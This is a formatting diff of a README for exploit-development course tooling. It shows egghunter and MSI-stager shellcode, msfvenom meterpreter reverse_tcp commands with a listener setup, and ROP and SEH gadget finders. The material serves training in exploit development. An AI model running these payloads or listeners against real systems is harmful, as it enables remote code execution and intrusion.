@@ -1,18 +1,22 @@
 # osed-scripts
-bespoke tooling for offensive security's Windows Usermode Exploit Dev course (OSED)
+
+bespoke tooling for offensive security's Windows Usermode Exploit Dev course
+(OSED)
 
 ## Table of Contents
 
 - [Standalone Scripts](#standalone-scripts)
-    - [egghunter.py](#egghunterpy)
-    - [find-gadgets.py](#find-gadgetspy)
-    - [shellcoder.py](#shellcoderpy)
-    - [install-mona.sh](#install-monash)
+  - [egghunter.py](#egghunterpy)
+  - [find-gadgets.py](#find-gadgetspy)
+  - [shellcoder.py](#shellcoderpy)
+  - [install-mona.sh](#install-monash)
 - [WinDbg Scripts](#windbg-scripts)
-    - [find-ppr.py](#find-pprpy)
+  - [find-ppr.py](#find-pprpy)
 
 ## Standalone Scripts
+
 ### Installation:
+
 pip3 install keystone-engine numpy
 
 ### egghunter.py
@@ -31,11 +35,12 @@ optional arguments:
                         space separated list of bad chars to check for in final egghunter (default: 00)
   -s, --seh             create an seh based egghunter instead of NtAccessCheckAndAuditAlarm
 
-```                        
+```
 
 generate default egghunter
+
 ```
-./egghunter.py 
+./egghunter.py
 [+] egghunter created!
 [=]   len: 35 bytes
 [=]   tag: c0d3c0d3
@@ -46,6 +51,7 @@ egghunter = b"\x66\x81\xca\xff\x0f\x42\x52\x31\xc0\x66\x05\xc6\x01\xcd\x2e\x3c\x
 ```
 
 generate egghunter with `w00tw00t` tag
+
 ```
 ./egghunter.py --tag w00t
 [+] egghunter created!
@@ -57,7 +63,9 @@ egghunter = b"\x66\x81\xca\xff\x0f\x42\x52\x31\xc0\x66\x05\xc6\x01\xcd\x2e\x3c\x
 
 ```
 
-generate SEH-based egghunter while checking for bad characters (does not alter the shellcode, that's to be done manually)
+generate SEH-based egghunter while checking for bad characters (does not alter
+the shellcode, that's to be done manually)
+
 ```
 ./egghunter.py -b 00 0a 25 26 3d --seh
 [+] egghunter created!
@@ -71,9 +79,13 @@ egghunter = b"\xeb\x2a\x59\xb8\x63\x30\x64\x33\x51\x6a\xff\x31\xdb\x64\x89\x23\x
 
 ### find-gadgets.py
 
-Finds and categorizes useful gadgets. Only prints to terminal the cleanest gadgets available (minimal amount of garbage between what's searched for and the final ret instruction).  All gadgets are written to a text file for further searching.
+Finds and categorizes useful gadgets. Only prints to terminal the cleanest
+gadgets available (minimal amount of garbage between what's searched for and the
+final ret instruction). All gadgets are written to a text file for further
+searching.
 
-requires [rich](https://github.com/willmcgugan/rich) and [ropper](https://github.com/sashs/Ropper)
+requires [rich](https://github.com/willmcgugan/rich) and
+[ropper](https://github.com/sashs/Ropper)
 
 ```text
 usage: find-gadgets.py [-h] -f FILES [FILES ...] [-b BAD_CHARS [BAD_CHARS ...]] [-o OUTPUT]
@@ -90,7 +102,8 @@ optional arguments:
                         name of output file where all (uncategorized) gadgets are written (default: found-gadgets.txt)
 ```
 
-find gadgets in multiple files (one is loaded at a different offset than what the dll prefers) and omit `0x00` and `0xde` from all gadgets
+find gadgets in multiple files (one is loaded at a different offset than what
+the dll prefers) and omit `0x00` and `0xde` from all gadgets
 
 ![gadgets](img/gadgets.png)
 
@@ -122,30 +135,31 @@ optional arguments:
 
 ```
 ❯ python3 shellcode.py --msi -l 192.168.49.88 -s
-[+] shellcode created! 
-[=]   len:   251 bytes                                                                                            
+[+] shellcode created!
+[=]   len:   251 bytes
 [=]   lhost: 192.168.49.88
-[=]   lport: 4444                                                                                                                                                                                                                    
-[=]   break: breakpoint disabled                                                                                                                                                                                                     
+[=]   lport: 4444
+[=]   break: breakpoint disabled
 [=]   ver:   MSI stager
 [=]   Shellcode stored in: shellcode.bin
 [=]   help:
          Create msi payload:
                  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.49.88 LPORT=443 -f msi -o X
          Start http server (hosting the msi file):
-                 sudo python -m SimpleHTTPServer 4444 
+                 sudo python -m SimpleHTTPServer 4444
          Start the metasploit listener:
                  sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.49.88; set LPORT 443; exploit"
-         Remove bad chars with msfvenom (use --store-shellcode flag): 
+         Remove bad chars with msfvenom (use --store-shellcode flag):
                  cat shellcode.bin | msfvenom --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d" -f python -v shellcode
 
-shellcode = b"\x89\xe5\x81\xc4\xf0\xf9\xff\xff\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x5e\x08\x8b\x7e\x20\x8b\x36\x66\x39\x4f\x18\x75\xf2\xeb\x06\x5e\x89\x75\x04\xeb\x54\xe8\xf5\xff\xff\xff\x60\x8b\x43\x3c\x8b\x7c\x03\x78\x01\xdf\x8b\x4f\x18\x8b\x47\x20\x01\xd8\x89\x45\xfc\xe3\x36\x49\x8b\x45\xfc\x8b\x34\x88\x01\xde\x31\xc0\x99\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x24\x75\xdf\x8b\x57\x24\x01\xda\x66\x8b\x0c\x4a\x8b\x57\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89\x44\x24\x1c\x61\xc3\x68\x83\xb9\xb5\x78\xff\x55\x04\x89\x45\x10\x68\x8e\x4e\x0e\xec\xff\x55\x04\x89\x45\x14\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x72\x74\x2e\x64\x68\x6d\x73\x76\x63\x54\xff\x55\x14\x89\xc3\x68\xa7\xad\x2f\x69\xff\x55\x04\x89\x45\x18\x31\xc0\x66\xb8\x71\x6e\x50\x68\x2f\x58\x20\x2f\x68\x34\x34\x34\x34\x68\x2e\x36\x34\x3a\x68\x38\x2e\x34\x39\x68\x32\x2e\x31\x36\x68\x2f\x2f\x31\x39\x68\x74\x74\x70\x3a\x68\x2f\x69\x20\x68\x68\x78\x65\x63\x20\x68\x6d\x73\x69\x65\x54\xff\x55\x18\x31\xc9\x51\x6a\xff\xff\x55\x10"           
+shellcode = b"\x89\xe5\x81\xc4\xf0\xf9\xff\xff\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x5e\x08\x8b\x7e\x20\x8b\x36\x66\x39\x4f\x18\x75\xf2\xeb\x06\x5e\x89\x75\x04\xeb\x54\xe8\xf5\xff\xff\xff\x60\x8b\x43\x3c\x8b\x7c\x03\x78\x01\xdf\x8b\x4f\x18\x8b\x47\x20\x01\xd8\x89\x45\xfc\xe3\x36\x49\x8b\x45\xfc\x8b\x34\x88\x01\xde\x31\xc0\x99\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x24\x75\xdf\x8b\x57\x24\x01\xda\x66\x8b\x0c\x4a\x8b\x57\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89\x44\x24\x1c\x61\xc3\x68\x83\xb9\xb5\x78\xff\x55\x04\x89\x45\x10\x68\x8e\x4e\x0e\xec\xff\x55\x04\x89\x45\x14\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x72\x74\x2e\x64\x68\x6d\x73\x76\x63\x54\xff\x55\x14\x89\xc3\x68\xa7\xad\x2f\x69\xff\x55\x04\x89\x45\x18\x31\xc0\x66\xb8\x71\x6e\x50\x68\x2f\x58\x20\x2f\x68\x34\x34\x34\x34\x68\x2e\x36\x34\x3a\x68\x38\x2e\x34\x39\x68\x32\x2e\x31\x36\x68\x2f\x2f\x31\x39\x68\x74\x74\x70\x3a\x68\x2f\x69\x20\x68\x68\x78\x65\x63\x20\x68\x6d\x73\x69\x65\x54\xff\x55\x18\x31\xc9\x51\x6a\xff\xff\x55\x10"
 ****
 ```
 
 ### install-mona.sh
 
-downloads all components necessary to install mona and prompts you to use an admin shell on the windows box to finish installation.
+downloads all components necessary to install mona and prompts you to use an
+admin shell on the windows box to finish installation.
 
 ```
 ❯ ./install-mona.sh 192.168.XX.YY
@@ -173,12 +187,14 @@ Clipboard(error): xclip_handle_SelectionNotify(), unable to find a textual targe
 
 all windbg scripts require `pykd`
 
-run `.load pykd` then `!py c:\path\to\this\repo\script.py` 
+run `.load pykd` then `!py c:\path\to\this\repo\script.py`
 
 ### find-ppr.py
 
-Search for `pop r32; pop r32; ret` instructions by module name. By default it only shows usable addresses without bad chars defined in the BADCHARS list on line 6.
-Printed next to the gadgets is an escaped little endian address for pasting into your shellcode.
+Search for `pop r32; pop r32; ret` instructions by module name. By default it
+only shows usable addresses without bad chars defined in the BADCHARS list on
+line 6. Printed next to the gadgets is an escaped little endian address for
+pasting into your shellcode.
 
     0:000> !py find-ppr_ns.py libspp libsync
     [+] searching libsync for pop r32; pop r32; ret
@@ -193,16 +209,16 @@ Printed next to the gadgets is an escaped little endian address for pasting into
     [OK] libspp::0x10150fc8: pop edi; pop esi; ret ; \xC8\x0F\x15\x10
     [OK] libspp::0x10151820: pop edi; pop esi; ret ; \x20\x18\x15\x10
     [+] libspp: Found 316 usable gadgets!
-    
+
     ---- STATS ----
     >> BADCHARS: \x00\x0A\x0D
     >> Usable Gadgets Found: 316
     >> Module Gadget Counts
-       - libsync: 0 
-       - libspp: 316 
+       - libsync: 0
+       - libspp: 316
     Done!
 
-Show all gadgets with the `-s` flag. 
+Show all gadgets with the `-s` flag.
 
     0:000> !py find-ppr_ns.py libspp libsync -s
     [+] searching libsync for pop r32; pop r32; ret
@@ -214,11 +230,11 @@ Show all gadgets with the `-s` flag.
     [OK] libspp::0x10150fc8: pop edi; pop esi; ret ; \xC8\x0F\x15\x10
     [OK] libspp::0x10151820: pop edi; pop esi; ret ; \x20\x18\x15\x10
     [+] libspp: Found 316 usable gadgets!
-    
+
     ---- STATS ----
     >> BADCHARS: \x00\x0A\x0D
     >> Usable Gadgets Found: 316
     >> Module Gadget Counts
-       - libsync: 0 
-       - libspp: 316 
+       - libsync: 0
+       - libspp: 316
     Done!
